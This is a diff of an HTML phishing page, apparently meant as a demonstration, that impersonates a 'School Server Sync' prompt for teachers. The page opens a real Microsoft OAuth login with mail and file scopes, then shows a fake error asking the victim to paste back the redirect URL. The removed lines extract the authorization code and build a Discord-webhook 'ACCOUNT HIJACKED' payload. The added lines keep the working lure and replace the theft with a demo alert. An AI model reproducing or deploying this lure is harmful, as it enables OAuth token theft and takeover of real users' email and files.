@@ -1,68 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>ConsentFix Education</title>
-</head>
 <body>
 
-    <!-- This is the part that actually shows up for the teacher -->
-    <div id="display-area" style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2>School Server Sync</h2>
-        <p>Your session needs to be refreshed.</p>
-        <button onclick="redirectToRealAuth()" style="padding: 10px; background: #0078d4; color: white; border: none;">
-            Sync Now
-        </button>
-    </div>
+<!-- 1. THE VISUAL PART (What the teacher sees) -->
+<div id="display-area" style="text-align: center; font-family: sans-serif;">
+    <h2 style="color: #0078d4;">School Server Sync Required</h2>
+    <p>Your session has expired. Please re-authenticate to keep your D: drive access.</p>
+    <button onclick="redirectToRealAuth()" style="padding: 12px; background: #0078d4; color: white; border: none; cursor: pointer;">
+        Sync Now
+    </button>
+</div>
 
-    <script>
-        // This is the functional logic a black-hat would use
-        function redirectToRealAuth() {
-            const client_id = "00000000-0000-0000-0000-000000000000"; 
-            const redirect_uri = "http://localhost/verify"; 
-            const scope = "Mail.Read Files.ReadWrite.All offline_access"; 
-            
-            const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                            `client_id=${client_id}&response_type=code&` +
-                            `redirect_uri=${encodeURIComponent(redirect_uri)}&` +
-                            `scope=${encodeURIComponent(scope)}&response_mode=query`;
+<!-- 2. THE LOGIC PART (The "Secret" script) -->
+<script>
+function redirectToRealAuth() {
+    // This part opens the "Real" login
+    const authUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000000-0000-0000-0000-000000000000&response_type=code&redirect_uri=http://localhost/verify&scope=Mail.Read%20Files.ReadWrite.All%20offline_access";
+    window.open(authUrl, '_blank'); 
 
-            window.open(authUrl, '_blank'); 
-            
-            // This changes the screen to the "Trap"
-            document.getElementById('display-area').innerHTML = `
-                <h3 style="color:red">SYSTEM ERROR: Automatic Verification Failed.</h3>
-                <p>Please copy the URL from the window that just opened and paste it here:</p>
-                <input type="text" id="stolenCode" style="width:80%; padding: 10px;">
-                <br><br>
-                <button onclick="exfiltrateData()" style="padding: 10px;">Finish Sync</button>
-            `;
-        }
+    // This part changes the screen to the "Trap"
+    document.getElementById('display-area').innerHTML = `
+        <h3 style="color:red">⚠️ ERROR: 0x80048823</h3>
+        <p>Automatic sync failed. Copy the URL from the other window and paste it here to manually fix the connection:</p>
+        <input type="text" id="stolenCode" style="width:90%; padding: 10px;">
+        <br><br>
+        <button onclick="exfiltrateData()" style="padding: 10px;">Fix Connection</button>
+    `;
+}
 
-        async function exfiltrateData() {
-            const fullUrl = document.getElementById('stolenCode').value;
-            const codeMatch = fullUrl.match(/[?&]code=([^&]+)/);
-            const secretCode = codeMatch ? codeMatch[1] : null;
-
-            if (!secretCode) {
-                alert("Invalid URL. Please copy the full address bar.");
-                return;
-            }
-
-            // Webhook placeholder
-            const webhookURL = "PASTE_WEBHOOK_HERE"; 
-
-            const payload = {
-                embeds: [{
-                    title: "🔓 NEW ACCOUNT HIJACKED",
-                    color: 16711680,
-                    description: `**Stolen Auth Code:** \`${secretCode}\`\n**Source:** Teacher Workstation`
-                }]
-            };
-
-            console.log("Data that would be sent:", payload);
-            alert("Verification Complete. Data sent to attacker's server.");
-        }
-    </script>
+async function exfiltrateData() {
+    const fullUrl = document.getElementById('stolenCode').value;
+    alert("🚨 WHITE-HAT DEMO: If this were real, your 'Authorization Code' just got sent to the hacker's Discord!");
+}
+</script>
 
 </body>
 </html>
